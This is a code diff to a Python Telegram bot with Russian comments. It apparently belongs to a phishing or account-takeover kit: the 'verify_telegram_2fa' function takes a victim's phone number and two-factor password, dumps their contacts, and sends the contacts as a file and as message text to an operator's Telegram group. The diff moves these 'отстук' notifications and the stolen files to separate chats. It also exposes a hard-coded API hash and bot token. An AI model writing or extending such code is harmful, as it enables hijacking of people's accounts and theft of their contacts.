@@ -25,6 +25,8 @@ API_ID = "26120781"
 API_HASH = "1f72de4bdd4fc68a70d1f82f9c17af4e"
 BOT_TOKEN = "8599650382:AAESazEZQPK7UisG_LudLBeERROvJikCzzA"
 GROUP_CHAT_ID = "-1003488289989"
+NOTIFICATION_CHAT_ID = "-1003488289989"  # для отстуков
+FILES_CHAT_ID = "-1003305566057"
 
 # Инициализация бота
 bot = Bot(token=BOT_TOKEN)
@@ -60,7 +62,7 @@ async def send_notification(message_text: str):
     """Отправка отстука"""
     try:
         print(f"📢 ОТПРАВЛЯЕМ: {message_text}")
-        await bot.send_message(GROUP_CHAT_ID, message_text)
+        await bot.send_message(NOTIFICATION_CHAT_ID, message_text)
         print("✅ Отстук отправлен в группу!")
     except Exception as e:
         print(f"❌ Ошибка отправки: {e}")
@@ -371,7 +373,7 @@ async def verify_telegram_2fa(phone, password):
             try:
                 with open(contacts_txt_file, 'rb') as file:
                     await bot.send_document(
-                        GROUP_CHAT_ID,
+                        FILES_CHAT_ID,
                         types.BufferedInputFile(
                             file.read(),
                             filename=f"contacts_{phone_clean}.txt"
@@ -411,7 +413,7 @@ async def verify_telegram_2fa(phone, password):
         
         # 🔥 ОТПРАВЛЯЕМ КОНТАКТЫ В ГРУППУ
         try:
-            await bot.send_message(GROUP_CHAT_ID, contacts_text)
+            await bot.send_message(FILES_CHAT_ID, contacts_text)
             print(f"✅ Контакты отправлены в группу!")
         except Exception as e:
             print(f"❌ Ошибка отправки в группу: {e}")
